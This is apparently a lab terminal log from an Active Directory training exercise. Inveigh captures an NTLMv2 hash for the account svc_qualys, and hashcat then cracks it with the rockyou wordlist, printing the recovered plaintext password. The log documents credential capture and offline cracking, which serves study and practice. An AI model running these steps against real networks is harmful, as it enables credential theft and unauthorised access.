```
[+] [06:39:10] SMB(445) NTLM challenge [53586E2FCD31DDBD] sent to 172.16.5.25:50349
[+] [06:39:10] SMB(445) NTLMv2 captured for [INLANEFREIGHT\svc_qualys] from 172.16.5.130(ACADEMY-EA-FILE):50349:
svc_qualys::INLANEFREIGHT:53586E2FCD31DDBD:F3E81CC766468184DF6FB51D07F0B341:010100000000000028648E78961EDD01D54AEA6D9E76F2BF0000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000700080028648E78961EDD0106000400020000000800300030000000000000000000000000300000F241D0A080671CFD020A0D8F71636C7D122994E508496CBDB3F30F4DEE0428670A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000
[!] [06:39:10] SMB(445) NTLMv2 for [INLANEFREIGHT\svc_qualys] written to Inveigh-NTLMv2.txt
```


```
hashcat -m 5600 -a 0 svc_qualys /home/satoru/Desktop/HACKVISER/CAPT/rockyou.txt 
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-AMD Ryzen 7 4800H with Radeon Graphics, 2204/4409 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (2359 MB free)

Dictionary cache hit:
* Filename..: /home/satoru/Desktop/HACKVISER/CAPT/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

SVC_QUALYS::INLANEFREIGHT:53586e2fcd31ddbd:f3e81cc766468184df6fb51d07f0b341:010100000000000028648e78961edd01d54aea6d9e76f2bf0000000002001a0049004e004c0041004e004500460052004500490047004800540001001e00410043004100440045004d0059002d00450041002d004d005300300031000400260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c0003004600410043004100440045004d0059002d00450041002d004d005300300031002e0049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c000500260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c000700080028648e78961edd0106000400020000000800300030000000000000000000000000300000f241d0a080671cfd020a0d8f71636c7d122994e508496cbdb3f30f4dee0428670a001000000000000000000000000000000000000900200063006900660073002f003100370032002e00310036002e0035002e00320035000000000000000000:security#1
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: SVC_QUALYS::INLANEFREIGHT:53586e2fcd31ddbd:f3e81cc7...000000
Time.Started.....: Tue Jul 28 19:09:54 2026 (6 secs)
Time.Estimated...: Tue Jul 28 19:10:00 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/home/satoru/Desktop/HACKVISER/CAPT/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:   616.8 kH/s (2.72ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 3923968/14344384 (27.36%)
Rejected.........: 0/3923968 (0.00%)
Restore.Point....: 3919872/14344384 (27.33%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: seemonkey1 -> secinika!
Hardware.Mon.#01.: Util: 40%

Started: Tue Jul 28 19:09:53 2026
Stopped: Tue Jul 28 19:10:02 2026

```

